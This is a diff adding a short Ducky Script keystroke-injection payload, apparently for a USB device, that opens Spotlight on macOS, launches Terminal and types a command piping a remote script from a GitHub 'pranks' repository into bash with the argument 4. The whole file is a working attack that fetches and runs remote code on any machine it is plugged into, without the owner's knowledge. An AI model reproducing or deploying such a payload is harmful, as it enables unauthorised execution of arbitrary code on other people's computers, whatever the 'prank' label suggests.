@@ -1,0 +1,7 @@
+DELAY 2000
+GUI SPACE
+STRING terminal
+ENTER
+DELAY 1000
+STRING bash <(curl -s https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/menu.sh) 4
+ENTER
